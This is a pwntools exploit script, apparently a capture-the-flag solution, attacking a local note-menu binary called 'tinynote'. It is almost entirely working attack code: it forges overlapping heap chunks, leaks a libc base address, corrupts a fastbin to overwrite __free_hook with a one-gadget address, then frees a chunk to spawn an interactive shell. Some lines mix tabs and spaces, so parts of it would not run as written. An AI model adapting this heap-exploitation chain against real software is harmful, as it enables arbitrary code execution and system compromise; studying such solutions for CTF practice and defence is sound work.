from pwn import *

#context.log_level = 'debug'
sh = process('./tinynote')
elf = ELF('./tinynote')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')


def add(size,note):
	sh.sendlineafter('> ','1')
	sh.sendlineafter('Size: ',str(size))
	sh.sendlineafter('Note: \n',note)

def show(idx):
	sh.sendlineafter('> ','2')
	sh.sendlineafter('index: ',str(idx))

def edit(idx,size,note):
	sh.sendlineafter('> ','3')
	sh.sendlineafter('index: ',str(idx))
        sh.sendlineafter('size: ',str(size))
        sh.sendlineafter('Note: \n',note)

def dele(idx):
	sh.sendlineafter('> ','4')
        sh.sendlineafter('index: ',str(idx))

#--------------over lapping---------------
add(0x90,'0')
add(0x18,'1')
add(0x18,'2')
add(0x110,'3'*0xf0+p64(0x100)+p64(0x21))
add(0x18,'4')
dele(0)
edit(2,0x18,'2'*0x10+p64(0xe0))
dele(3)
#gdb.attach(sh)
#-------------leak libc---------------------
add(0x90,'0')
show(1)
leak = u64(sh.recv(8))
libc_base = leak-88-0x3c4b20
print hex(libc_base)
one = libc_base +0x4526a#+libc.symbols['system']
#--------------------------------------
#edit(1,0x18,p64(leak)+p64(leak-88-0x33))
#add(0x60,'a'*0x13)
add(0x18,'3')
add(0x60,'5')
dele(2)
edit(5,8,p64(0x60203d))
add(0x60,'2')
add(0x60,'\x00'*0x13+p64(0x90)+p64(1)+p64(libc.symbols['__free_hook']+libc_base))


edit(0,8,p64(one))
dele(2)
sh.interactive()
